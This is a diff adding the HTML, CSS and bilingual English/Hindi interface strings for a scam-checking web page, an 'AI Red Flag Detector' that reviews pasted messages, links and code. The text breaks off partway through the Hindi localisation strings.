@@ -1,0 +1,1286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>AI Red Flag Detector</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@500;600;700;800&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Noto+Sans+Devanagari:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #F5F9F7;
+    --surface: #FFFFFF;
+    --surface-soft: #EFF6F2;
+    --border: #E1EAE6;
+    --ink: #17241F;
+    --ink-soft: #5C6D66;
+    --ink-faint: #8B9C95;
+    --brand: #0E7C6B;
+    --brand-dark: #0A5E51;
+    --brand-light: #E3F4EF;
+    --safe: #1F9D64;
+    --safe-light: #E7F8EE;
+    --caution: #D98A1F;
+    --caution-light: #FBF1E1;
+    --danger: #D64545;
+    --danger-light: #FBEAEA;
+    --radius: 16px;
+    --radius-sm: 10px;
+    --shadow-sm: 0 1px 2px rgba(23,36,31,0.06), 0 1px 1px rgba(23,36,31,0.04);
+    --shadow-md: 0 8px 24px rgba(23,36,31,0.08);
+    --shadow-lg: 0 20px 48px rgba(23,36,31,0.14);
+    font-family:'Inter', sans-serif;
+  }
+
+  *{box-sizing:border-box;}
+  html{-webkit-text-size-adjust:100%; scroll-behavior:smooth;}
+
+  @media (prefers-reduced-motion: reduce){
+    *, *::before, *::after{ animation-duration:0.001ms !important; animation-iteration-count:1 !important; transition-duration:0.001ms !important; scroll-behavior:auto !important; }
+  }
+
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--ink);
+    font-family:'Inter', sans-serif;
+    -webkit-font-smoothing:antialiased;
+    min-height:100vh;
+  }
+  body.lang-hi{ font-family:'Noto Sans Devanagari','Inter', sans-serif; }
+  body.lang-hi h1, body.lang-hi .brand-name, body.lang-hi .verdict-label, body.lang-hi .analyze-btn{
+    font-family:'Noto Sans Devanagari','Sora', sans-serif;
+  }
+
+  a{color:var(--brand);}
+
+  .wrap{max-width:980px;margin:0 auto; padding:0 20px 80px;}
+
+  .topbar{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:22px 0 18px;
+    gap:12px;
+  }
+  .brand{
+    display:flex;
+    align-items:center;
+    gap:10px;
+  }
+  .brand-mark{
+    width:34px; height:34px;
+    flex:none;
+    display:flex; align-items:center; justify-content:center;
+    color:var(--brand);
+  }
+  .brand-name{
+    font-family:'Sora', sans-serif;
+    font-weight:700;
+    font-size:17px;
+    letter-spacing:-0.01em;
+    color:var(--ink);
+  }
+  .lang-toggle{
+    display:flex;
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:999px;
+    padding:3px;
+    box-shadow:var(--shadow-sm);
+  }
+  .lang-btn{
+    font-family:'Inter', sans-serif;
+    font-size:12.5px;
+    font-weight:600;
+    background:transparent;
+    color:var(--ink-soft);
+    border:none;
+    border-radius:999px;
+    padding:7px 14px;
+    cursor:pointer;
+    transition:background .18s ease, color .18s ease;
+  }
+  .lang-btn.active{ background:var(--brand); color:#fff; }
+
+  .hero{
+    text-align:center;
+    padding:22px 0 34px;
+  }
+  h1{
+    font-family:'Sora', sans-serif;
+    font-weight:800;
+    font-size:clamp(30px, 5vw, 46px);
+    line-height:1.1;
+    letter-spacing:-0.02em;
+    margin:0 0 14px;
+    color:var(--ink);
+  }
+  h1 .accent{ color:var(--brand); }
+  .subhead{
+    font-size:16px;
+    color:var(--ink-soft);
+    max-width:560px;
+    margin:0 auto;
+    line-height:1.6;
+  }
+
+  .card{
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:var(--radius);
+    box-shadow:var(--shadow-md);
+    padding:24px;
+  }
+  @media (max-width:600px){ .card{ padding:18px; border-radius:14px; } }
+
+  .mode-tabs{
+    display:flex;
+    flex-wrap:wrap;
+    gap:6px;
+    margin-bottom:14px;
+  }
+  .mode-tab{
+    flex:1 1 calc(50% - 6px);
+    min-width:110px;
+    font-family:'Inter', sans-serif;
+    font-size:13px;
+    font-weight:600;
+    background:var(--surface-soft);
+    border:1px solid transparent;
+    color:var(--ink-soft);
+    border-radius:10px;
+    padding:10px 8px;
+    cursor:pointer;
+    text-align:center;
+    transition:all .16s ease;
+  }
+  .mode-tab:hover{ color:var(--ink); }
+  .mode-tab.active{
+    background:var(--brand);
+    color:#fff;
+    box-shadow:0 4px 10px rgba(14,124,107,0.28);
+  }
+
+  textarea{
+    width:100%;
+    min-height:170px;
+    resize:vertical;
+    background:var(--surface-soft);
+    border:1.5px solid var(--border);
+    border-radius:var(--radius-sm);
+    color:var(--ink);
+    font-family:'JetBrains Mono', monospace;
+    font-size:16px;
+    line-height:1.6;
+    padding:14px;
+    outline:none;
+    transition:border-color .16s ease, background .16s ease;
+  }
+  @media (min-width: 600px){ textarea{ font-size:13.5px; min-height:200px; } }
+  textarea:focus{ border-color:var(--brand); background:var(--surface); }
+  textarea::placeholder{ color:var(--ink-faint); }
+
+  .examples-label{
+    font-size:12px;
+    font-weight:600;
+    color:var(--ink-faint);
+    margin:16px 0 8px;
+    text-transform:uppercase;
+    letter-spacing:0.06em;
+  }
+  .examples{
+    display:flex;
+    flex-wrap:wrap;
+    gap:8px;
+  }
+  .chip{
+    font-family:'Inter', sans-serif;
+    font-size:12.5px;
+    font-weight:500;
+    background:var(--surface);
+    border:1px solid var(--border);
+    color:var(--ink-soft);
+    border-radius:999px;
+    padding:8px 13px;
+    cursor:pointer;
+    transition:all .15s ease;
+  }
+  .chip:hover{ border-color:var(--brand); color:var(--brand); transform:translateY(-1px); box-shadow:var(--shadow-sm); }
+
+  .analyze-btn{
+    margin-top:20px;
+    width:100%;
+    font-family:'Sora', sans-serif;
+    font-size:16px;
+    font-weight:700;
+    letter-spacing:-0.005em;
+    background:var(--brand);
+    color:#fff;
+    border:none;
+    border-radius:var(--radius-sm);
+    padding:16px;
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:9px;
+    transition:transform .1s ease, background .15s ease, box-shadow .15s ease;
+    box-shadow:0 6px 16px rgba(14,124,107,0.28);
+  }
+  .analyze-btn:hover{ background:var(--brand-dark); box-shadow:0 8px 20px rgba(14,124,107,0.34); }
+  .analyze-btn:active{ transform:scale(0.985); }
+  .analyze-btn:disabled{ opacity:0.65; cursor:wait; transform:none; }
+  .analyze-btn svg{ flex:none; }
+
+  .btn-spinner{
+    width:18px; height:18px;
+    border-radius:50%;
+    border:2.5px solid rgba(255,255,255,0.4);
+    border-top-color:#fff;
+    animation:spin 0.8s linear infinite;
+    display:none;
+  }
+  .analyze-btn.loading .btn-spinner{ display:inline-block; }
+  .analyze-btn.loading .btn-icon{ display:none; }
+  @keyframes spin{ to{ transform:rotate(360deg); } }
+
+  .helper-note{
+    text-align:center;
+    font-size:12.5px;
+    color:var(--ink-faint);
+    margin-top:12px;
+  }
+
+  #results-wrap{ margin-top:28px; }
+
+  @keyframes riseIn{
+    from{ opacity:0; transform:translateY(14px); }
+    to{ opacity:1; transform:translateY(0); }
+  }
+  .reveal{ animation:riseIn .45s cubic-bezier(.22,1,.36,1) both; }
+  .reveal-1{ animation-delay:.02s; }
+  .reveal-2{ animation-delay:.08s; }
+  .reveal-3{ animation-delay:.14s; }
+  .reveal-4{ animation-delay:.20s; }
+
+  .verdict-card{
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:var(--radius);
+    box-shadow:var(--shadow-md);
+    padding:26px;
+    text-align:center;
+  }
+  @media (max-width:600px){ .verdict-card{ padding:20px 16px; } }
+
+  .verdict-icon-wrap{
+    width:76px; height:76px;
+    margin:0 auto 14px;
+    border-radius:50%;
+    display:flex; align-items:center; justify-content:center;
+    transition:background .3s ease;
+  }
+  .verdict-icon-wrap.safe{ background:var(--safe-light); color:var(--safe); }
+  .verdict-icon-wrap.caution{ background:var(--caution-light); color:var(--caution); }
+  .verdict-icon-wrap.flagged{ background:var(--danger-light); color:var(--danger); }
+  .verdict-icon-wrap.pending{ background:var(--brand-light); color:var(--brand); }
+  .verdict-icon-wrap svg{ width:38px; height:38px; }
+
+  @keyframes popIn{
+    0%{ transform:scale(0.6); opacity:0; }
+    60%{ transform:scale(1.08); opacity:1; }
+    100%{ transform:scale(1); }
+  }
+  .verdict-icon-wrap.animate-pop svg{ animation:popIn .45s cubic-bezier(.22,1.4,.36,1) both; }
+
+  @keyframes scanSweep{
+    0%{ transform:translateY(-120%); opacity:0; }
+    15%{ opacity:1; }
+    85%{ opacity:1; }
+    100%{ transform:translateY(120%); opacity:0; }
+  }
+  .verdict-icon-wrap.pending{ position:relative; overflow:hidden; }
+  .verdict-icon-wrap.pending::after{
+    content:"";
+    position:absolute; left:0; right:0; height:40%;
+    background:linear-gradient(180deg, transparent, rgba(14,124,107,0.35), transparent);
+    animation:scanSweep 1.4s ease-in-out infinite;
+  }
+
+  .verdict-label{
+    font-family:'Sora', sans-serif;
+    font-weight:700;
+    font-size:22px;
+    letter-spacing:-0.01em;
+    margin-bottom:6px;
+  }
+  .verdict-label.safe{ color:var(--safe); }
+  .verdict-label.caution{ color:var(--caution); }
+  .verdict-label.flagged{ color:var(--danger); }
+  .verdict-label.pending{ color:var(--brand); }
+
+  .verdict-summary{
+    font-size:15px;
+    color:var(--ink-soft);
+    line-height:1.6;
+    max-width:520px;
+    margin:0 auto 18px;
+  }
+
+  .score-row{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:22px;
+    flex-wrap:wrap;
+    margin-top:6px;
+  }
+  .score-ring-block{ display:flex; align-items:center; gap:12px; }
+  .score-ring circle.track{ stroke:var(--border); }
+  .score-ring circle.fill{ transition:stroke-dashoffset 1s cubic-bezier(.22,1,.36,1), stroke .3s ease; stroke-linecap:round; }
+  .score-num{ font-family:'Sora', sans-serif; font-weight:700; font-size:20px; }
+  .score-label{ font-size:11px; color:var(--ink-faint); font-weight:600; text-transform:uppercase; letter-spacing:0.05em; margin-top:2px;}
+
+  .source-pills{ display:flex; gap:8px; flex-wrap:wrap; justify-content:center; }
+  .source-pill{
+    font-size:11.5px;
+    font-weight:600;
+    background:var(--surface-soft);
+    border:1px solid var(--border);
+    border-radius:999px;
+    padding:6px 12px;
+    color:var(--ink-soft);
+  }
+  .source-pill b{ color:var(--ink); }
+
+  .error-banner{
+    background:var(--danger-light);
+    border-radius:var(--radius-sm);
+    padding:12px 14px;
+    font-size:13px;
+    line-height:1.6;
+    color:#8f2f2f;
+    margin-top:18px;
+    text-align:left;
+  }
+  .retry-btn{
+    margin-top:10px;
+    font-size:12.5px;
+    font-weight:600;
+    background:#fff;
+    border:1px solid var(--danger);
+    color:var(--danger);
+    border-radius:8px;
+    padding:8px 14px;
+    cursor:pointer;
+    transition:background .15s ease;
+  }
+  .retry-btn:hover{ background:var(--danger); color:#fff; }
+
+  .section{
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:var(--radius);
+    box-shadow:var(--shadow-sm);
+    margin-top:16px;
+    overflow:hidden;
+  }
+  .section-head{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    padding:18px 22px;
+  }
+  .section-head svg{ flex:none; color:var(--brand); }
+  .section-title{
+    font-family:'Sora', sans-serif;
+    font-weight:700;
+    font-size:15.5px;
+    color:var(--ink);
+  }
+  .section-sub{
+    font-size:12.5px;
+    color:var(--ink-faint);
+    margin-top:2px;
+  }
+  .section-body{ padding:0 22px 22px; }
+  @media (max-width:600px){ .section-head, .section-body{ padding-left:16px; padding-right:16px; } }
+
+  .evidence-block{
+    background:var(--surface-soft);
+    border:1px solid var(--border);
+    border-radius:var(--radius-sm);
+    padding:14px;
+    font-family:'JetBrains Mono', monospace;
+    font-size:13px;
+    line-height:1.8;
+    white-space:pre-wrap;
+    word-break:break-word;
+    overflow-wrap:anywhere;
+  }
+  mark{
+    background:none;
+    color:inherit;
+    padding:0 2px;
+    border-radius:3px;
+    cursor:help;
+    font-weight:600;
+  }
+  mark.sev-high{ background:var(--danger-light); color:#8f2f2f; }
+  mark.sev-med{ background:var(--caution-light); color:#8a5c14; }
+
+  .findings-list{ display:flex; flex-direction:column; gap:10px; }
+  .finding{
+    display:flex;
+    gap:12px;
+    padding:13px 14px;
+    border-radius:var(--radius-sm);
+    border:1px solid var(--border);
+    background:var(--surface);
+    transition:transform .15s ease, box-shadow .15s ease;
+  }
+  .finding:hover{ transform:translateY(-1px); box-shadow:var(--shadow-sm); }
+  .finding-icon{
+    flex:none;
+    width:30px; height:30px;
+    border-radius:8px;
+    display:flex; align-items:center; justify-content:center;
+  }
+  .finding.sev-high .finding-icon{ background:var(--danger-light); color:var(--danger); }
+  .finding.sev-med .finding-icon{ background:var(--caution-light); color:var(--caution); }
+  .finding-cat{
+    font-size:11px;
+    font-weight:700;
+    text-transform:uppercase;
+    letter-spacing:0.05em;
+    color:var(--brand);
+    margin-bottom:3px;
+  }
+  .finding-desc{ font-size:14px; line-height:1.55; color:var(--ink); margin:0; }
+  .finding-match{
+    font-family:'JetBrains Mono', monospace;
+    font-size:12px;
+    background:var(--surface-soft);
+    padding:1px 6px;
+    border-radius:4px;
+    word-break:break-all;
+  }
+  .no-findings{
+    font-size:13.5px;
+    color:var(--ink-soft);
+    background:var(--safe-light);
+    border-radius:var(--radius-sm);
+    padding:14px;
+    line-height:1.6;
+  }
+
+  .checklist-toggle{
+    width:100%;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    background:transparent;
+    border:none;
+    padding:18px 22px;
+    cursor:pointer;
+    text-align:left;
+  }
+  @media (max-width:600px){ .checklist-toggle{ padding-left:16px; padding-right:16px; } }
+  .checklist-toggle:hover .section-title{ color:var(--brand); }
+  .chevron{ transition:transform .25s ease; color:var(--ink-faint); flex:none; }
+  .checklist-toggle[aria-expanded="true"] .chevron{ transform:rotate(180deg); }
+
+  .checklist-panel{
+    max-height:0;
+    overflow:hidden;
+    transition:max-height .35s ease;
+  }
+  .checklist-panel.open{ max-height:2000px; }
+  .checklist-inner{ padding:0 22px 22px; }
+  @media (max-width:600px){ .checklist-inner{ padding-left:16px; padding-right:16px; } }
+
+  .checklist-group{ margin-bottom:14px; }
+  .checklist-group:last-child{ margin-bottom:0; }
+  .checklist-group-name{
+    font-size:11px;
+    font-weight:700;
+    text-transform:uppercase;
+    letter-spacing:0.06em;
+    color:var(--ink-faint);
+    margin-bottom:8px;
+  }
+  .checklist-row{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-size:13.5px;
+    padding:6px 0;
+    color:var(--ink-soft);
+  }
+  .checklist-row.fail{ color:var(--ink); font-weight:600; }
+  .check-icon{
+    flex:none;
+    width:20px; height:20px;
+    border-radius:50%;
+    display:flex; align-items:center; justify-content:center;
+  }
+  .check-icon.pass{ background:var(--safe-light); color:var(--safe); }
+  .check-icon.fail-high{ background:var(--danger-light); color:var(--danger); }
+  .check-icon.fail-med{ background:var(--caution-light); color:var(--caution); }
+  .check-icon svg{ width:12px; height:12px; }
+
+  .ai-card{
+    background:linear-gradient(180deg, var(--brand-light), var(--surface) 70%);
+    border-radius:var(--radius-sm);
+    padding:16px 18px;
+    border:1px solid var(--border);
+  }
+  .ai-card-head{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    flex-wrap:wrap;
+    gap:8px;
+    margin-bottom:10px;
+  }
+  .ai-category{
+    font-size:12px;
+    font-weight:700;
+    color:var(--brand-dark);
+    text-transform:uppercase;
+    letter-spacing:0.04em;
+  }
+  .ai-badge{
+    font-family:'Sora', sans-serif;
+    font-size:11.5px;
+    font-weight:700;
+    padding:4px 11px;
+    border-radius:999px;
+    letter-spacing:0.02em;
+  }
+  .ai-badge.safe{ background:var(--safe-light); color:var(--safe); }
+  .ai-badge.caution{ background:var(--caution-light); color:var(--caution); }
+  .ai-badge.flagged{ background:var(--danger-light); color:var(--danger); }
+  .ai-body{ font-size:14.5px; line-height:1.65; color:var(--ink); }
+  .ai-foot{
+    margin-top:12px;
+    font-size:11.5px;
+    color:var(--ink-faint);
+    display:flex;
+    gap:14px;
+    flex-wrap:wrap;
+  }
+  .ai-pending{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-size:13.5px;
+    color:var(--ink-soft);
+  }
+  .dot-flow{ display:flex; gap:4px; }
+  .dot-flow span{
+    width:6px; height:6px; border-radius:50%;
+    background:var(--brand);
+    animation:dotPulse 1.2s ease-in-out infinite;
+  }
+  .dot-flow span:nth-child(2){ animation-delay:.15s; }
+  .dot-flow span:nth-child(3){ animation-delay:.3s; }
+  @keyframes dotPulse{ 0%,80%,100%{ opacity:.25; transform:scale(.8);} 40%{ opacity:1; transform:scale(1);} }
+
+  footer{
+    margin-top:40px;
+    text-align:center;
+    font-size:12.5px;
+    color:var(--ink-faint);
+    line-height:1.7;
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar">
+    <div class="brand">
+      <span class="brand-mark">
+        <svg width="34" height="34" viewBox="0 0 34 34" fill="none">
+          <path d="M17 3 L29 8 V16 C29 23.5 24 28.5 17 31 C10 28.5 5 23.5 5 16 V8 Z" fill="var(--brand-light)" stroke="var(--brand)" stroke-width="1.8" stroke-linejoin="round"/>
+          <path d="M12 17 L15.5 20.5 L22.5 12.5" stroke="var(--brand)" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </span>
+      <span class="brand-name" data-i18n="title">AI Red Flag Detector</span>
+    </div>
+    <div class="lang-toggle" id="lang-toggle">
+      <button class="lang-btn active" data-lang="en">EN</button>
+      <button class="lang-btn" data-lang="hi">हिंदी</button>
+    </div>
+  </div>
+
+  <div class="hero">
+    <h1 data-i18n="heroTitle">Not sure if it's <span class="accent">safe</span>?</h1>
+    <p class="subhead" data-i18n="subhead">Paste a message, link, or bit of code below. We'll scan it against known scam patterns and get a second opinion from AI — then explain what we found in plain language.</p>
+  </div>
+
+  <div class="card">
+    <div class="mode-tabs" id="mode-tabs">
+      <button class="mode-tab active" data-mode="auto" data-i18n="modeAuto">Auto detect</button>
+      <button class="mode-tab" data-mode="message" data-i18n="modeMessage">Message / Email</button>
+      <button class="mode-tab" data-mode="url" data-i18n="modeUrl">Link</button>
+      <button class="mode-tab" data-mode="code" data-i18n="modeCode">Code</button>
+    </div>
+
+    <textarea id="input-text" data-i18n-placeholder="placeholderAuto" placeholder="Paste a suspicious email, link, or code snippet here..."></textarea>
+
+    <p class="examples-label" data-i18n="tryExample">Or try an example</p>
+    <div class="examples">
+      <button class="chip" data-example="phishing" data-mode="message" data-i18n="exPhishing">📧 Fake shipping email</button>
+      <button class="chip" data-example="url" data-mode="url" data-i18n="exUrl">🔗 Sketchy link</button>
+      <button class="chip" data-example="code" data-mode="code" data-i18n="exCode">💻 Malicious code</button>
+      <button class="chip" data-example="scareware" data-mode="message" data-i18n="exScareware">☎️ Tech support scam</button>
+      <button class="chip" data-example="crypto" data-mode="message" data-i18n="exCrypto">💰 Crypto scam</button>
+      <button class="chip" data-example="typosquat" data-mode="url" data-i18n="exTyposquat">🎭 Lookalike domain</button>
+    </div>
+
+    <button class="analyze-btn" id="analyze-btn">
+      <svg class="btn-icon" width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M8 3 L14 5.5 V9 C14 12.5 11.5 15 8 16 C4.5 15 2 12.5 2 9 V5.5 Z" stroke="#fff" stroke-width="1.6" stroke-linejoin="round"/><path d="M5.5 9 L7.3 10.8 L11.5 6.5" stroke="#fff" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <span class="btn-spinner"></span>
+      <span data-i18n="analyzeBtn">Check it</span>
+    </button>
+    <p class="helper-note" data-i18n="helperNote">Nothing you paste here is saved — it's only used to run this check.</p>
+  </div>
+
+  <div id="results-wrap"></div>
+
+  <footer>
+    <span data-i18n="footer">Built to help you spot patterns, not replace your judgment.</span><br>
+    <span data-i18n="footerSub">Always verify important messages directly with the sender or organization.</span>
+  </footer>
+</div>
+
+<script>
+const API_BASE = window.RFD_API_BASE || "http://localhost:8000";
+let currentEvidenceText = "";
+let currentMatches = [];
+let currentHeuristicScore = 0;
+let currentLang = "en";
+let hasResult = false;
+
+const ICONS = {
+  shieldCheck: `<svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5 L20 5.5 V11 C20 16.5 16.5 20.5 12 22 C7.5 20.5 4 16.5 4 11 V5.5 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><path d="M8 11.5 L10.8 14.3 L16 8.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`,
+  shieldAlert: `<svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5 L20 5.5 V11 C20 16.5 16.5 20.5 12 22 C7.5 20.5 4 16.5 4 11 V5.5 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><path d="M12 8 V13" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16.2" r="1.15" fill="currentColor"/></svg>`,
+  shieldX: `<svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5 L20 5.5 V11 C20 16.5 16.5 20.5 12 22 C7.5 20.5 4 16.5 4 11 V5.5 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><path d="M9.3 9.3 L14.7 14.7 M14.7 9.3 L9.3 14.7" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>`,
+  shieldScan: `<svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5 L20 5.5 V11 C20 16.5 16.5 20.5 12 22 C7.5 20.5 4 16.5 4 11 V5.5 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/></svg>`,
+  check: `<svg viewBox="0 0 12 12" fill="none"><path d="M2.5 6.2 L4.8 8.5 L9.5 3.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`,
+  x: `<svg viewBox="0 0 12 12" fill="none"><path d="M2.5 2.5 L9.5 9.5 M9.5 2.5 L2.5 9.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>`,
+  magnify: `<svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="8" cy="8" r="5.2" stroke="currentColor" stroke-width="1.7"/><path d="M15 15 L11.7 11.7" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/></svg>`,
+  list: `<svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M4 5 H14 M4 9 H14 M4 13 H10" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/></svg>`,
+  clipboard: `<svg width="18" height="18" viewBox="0 0 18 18" fill="none"><rect x="4" y="3.5" width="10" height="12" rx="1.5" stroke="currentColor" stroke-width="1.6"/><path d="M7 3.5 V2.5 C7 2 7.4 1.6 8 1.6 H10 C10.6 1.6 11 2 11 2.5 V3.5" stroke="currentColor" stroke-width="1.6"/></svg>`,
+  sparkle: `<svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M9 2 L10.2 6.8 L15 8 L10.2 9.2 L9 14 L7.8 9.2 L3 8 L7.8 6.8 Z" fill="currentColor"/></svg>`,
+  chevronDown: `<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M4 6 L8 10 L12 6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>`,
+};
+
+const STRINGS = {
+  en: {
+    title: "AI Red Flag Detector",
+    heroTitle: 'Not sure if it\'s <span class="accent">safe</span>?',
+    subhead: "Paste a message, link, or bit of code below. We'll scan it against known scam patterns and get a second opinion from AI — then explain what we found in plain language.",
+    modeAuto: "Auto detect", modeMessage: "Message / Email", modeUrl: "Link", modeCode: "Code",
+    placeholderAuto: "Paste a suspicious email, link, or code snippet here...",
+    placeholderMessage: "Paste the full email or message text here...",
+    placeholderUrl: "Paste the suspicious link here...",
+    placeholderCode: "Paste the code snippet here...",
+    tryExample: "Or try an example",
+    exPhishing: "📧 Fake shipping email", exUrl: "🔗 Sketchy link", exCode: "💻 Malicious code",
+    exScareware: "☎️ Tech support scam", exCrypto: "💰 Crypto scam", exTyposquat: "🎭 Lookalike domain",
+    analyzeBtn: "Check it",
+    helperNote: "Nothing you paste here is saved — it's only used to run this check.",
+    footer: "Built to help you spot patterns, not replace your judgment.",
+    footerSub: "Always verify important messages directly with the sender or organization.",
+    yourText: "Your text, with flags highlighted",
+    yourTextSub: "Hover a highlight to see why it was flagged",
+    whatWeFound: "What we found",
+    whatWeFoundSub: (n) => n === 1 ? "1 thing worth a closer look" : `${n} things worth a closer look`,
+    nothingFound: "Nothing jumped out here — but that's not a full guarantee. See the AI's take below, and the full checklist for everything we checked.",
+    fullChecklist: "See everything we checked",
+    fullChecklistSub: "Every pattern we scan for, including the ones that didn't fire",
+    aiTake: "AI's second opinion",
+    aiTakeSub: "Looks at intent and context, not just keywords",
+    aiPending: "Reading it over for anything the pattern scan might miss…",
+    aiUnavailable: "Couldn't reach the AI analyst",
+    finalVerdictFallback: "The result above is based on the pattern scan only.",
+    retryAi: "Try again",
+    riskScore: "Risk score",
+    verdictSafe: "Looks safe",
+    verdictCaution: "Worth a second look",
+    verdictFlagged: "Red flag",
+    verdictPending: "Checking it now…",
+    summarySafeNoMatches: "Nothing matched our known red-flag patterns. We're still asking the AI for a second opinion, since some scams are new or don't use obvious keywords.",
+    summaryPrefix: "This looks risky because it",
+    joinTwo: ", and it also ",
+    joinLast: ", and ",
+    highSeverityNote: (h, tt) => `${h} of the ${tt} thing${tt>1?'s we found are':' we found is'} high-severity.`,
+    modSeverityNote: "What we found is moderate on its own, but worth being careful about.",
+    patternScan: "Pattern scan", aiAnalystLabel: "AI",
+    confidenceLabel: "Confidence",
+    catPhrases: {
+      "Social Engineering / Phishing": "uses pressure tactics or asks for sensitive info — classic phishing moves",
+      "Malicious URL Pattern": "links to a site disguised to look like one you trust",
+      "Code Injection (Web/Command)": "contains code built to manipulate a database, browser, or system",
+      "Malware / Scareware": "tries to panic you into installing or disabling something",
+      "Crypto & Financial Scam": "makes a financial promise no real offer would make",
+    }
+  },
+  hi: {
+    title: "AI रेड फ़्लैग डिटेक्टर",
+    heroTitle: 'पक्का नहीं कि यह <span class="accent">सुरक्षित</span> है?',
+    subhead: "नीचे कोई संदेश, लिंक या कोड पेस्ट करें। हम इसे जाने-पहचाने स्कैम पैटर्न से मिलाकर जाँचेंगे और AI से दूसरी राय भी लेंगे — फिर सब कुछ सरल भाषा में समझाएँगे।",
+    modeAuto: "ऑटो डिटेक्ट", modeMessage: "संदेश / ईमेल", modeUrl: "लिंक", modeCode: "कोड",
+    placeholderAuto: "यहाँ संदिग्ध ईमेल, लिंक या कोड स्निपेट पेस्ट करें...",
+    placeholderMessage: "पूरा ईमेल या संदेश यहाँ पेस्ट करें...",
+    placeholderUrl: "संदिग्ध लिंक यहाँ पेस्ट करें...",
+    placeholderCode: "कोड स्निपेट यहाँ पेस्ट करें...",
+    tryExample: "या एक उदाहरण आज़माएँ",
+    exPhishing: "📧 फ़र्ज़ी शिपिंग ईमेल", exUrl: "🔗 संदिग्ध लिंक", exCode: "💻 दुर्भावनापूर्ण कोड",
+    exScareware: "☎️ टेक-सपोर्ट स्कैम", exCrypto: "💰 क्रिप्टो स्कैम", exTyposquat: "🎭 नकली डोमेन",
+    analyzeBtn: "जाँच करें",
+    helperNote: "यहाँ पेस्ट की गई कोई भी चीज़ सेव नहीं होती — इसका उपयोग सिर्फ़ यह जाँच चलाने के लिए होता है।",
+    footer: "यह टूल पैटर्न पहचानने में मदद करता है, आपके फ़ैसले की जगह नहीं लेता।",
+    footerSub: "ज़रूरी संदेशों की पुष्टि हमेशा भेजने वाले या संस्था से सीधे करें।",
+    yourText: "आपका टेक्स्ट, चिन्हित हिस्सों के साथ",
+    yourTextSub: "क्यों चिन्हित किया गया, यह देखने के लिए हाइलाइट पर होवर करें",
+    whatWeFound: "हमें क्या मिला",
+    whatWeFoundSub: (n) => n === 1 ? "1 चीज़ ध्यान देने लायक" : `${n} चीज़ें ध्यान देने लायक`,
+    nothingFound: "यहाँ कुछ भी संदिग्ध नहीं दिखा — लेकिन यह पूरी गारंटी नहीं है। नीचे AI की राय देखें, और हमने जो कुछ भी जाँचा उसकी पूरी सूची भी।",
+    fullChecklist: "हमने जो कुछ भी जाँचा वह देखें",
+    fullChecklistSub: "हर वह पैटर्न जिसकी हम जाँच करते हैं, वे भी जो नहीं मिले",
+    aiTake: "AI की दूसरी राय",
+    aiTakeSub: "सिर्फ़ शब्दों को नहीं, इरादे और संदर्भ को भी देखता है",
+    aiPending: "पैटर्न स्कैन जो चूक सकता है, उसके लिए इसे ध्यान से पढ़ा जा रहा है…",
+    aiUnavailable: "AI विश्लेषक से संपर्क नहीं हो सका",
+    finalVerdictFallback: "ऊपर दिया गया परिणाम केवल पैटर्न स्कैन पर आधारित है।",
+    retryAi: "फिर से कोशिश करें",
+    riskScore: "जोखिम स्कोर",
+    verdictSafe: "सुरक्षित लगता है",
+    verdictCaution: "थोड़ा ध्यान देने लायक",
+    verdictFlagged: "रेड फ़्लैग",
+    verdictPending: "जाँच हो रही है…",
+    summarySafeNoMatches: "हमारे जाने-पहचाने रेड-फ़्लैग पैटर्न से कुछ नहीं मिला। हम फिर भी AI से दूसरी राय ले रहे हैं, क्योंकि कुछ स्कैम नए होते हैं या सीधे शब्दों का इस्तेमाल नहीं करते।",
+    summaryPrefix: "यह जोखिम भरा लगता है क्योंकि यह",
+    joinTwo: ", और यह भी ",
+    joinLast: ", और ",
+    highSeverityNote: (h, tt) => `${tt} में से ${h} चीज़ें उच्च-गंभीरता वाली हैं।`,
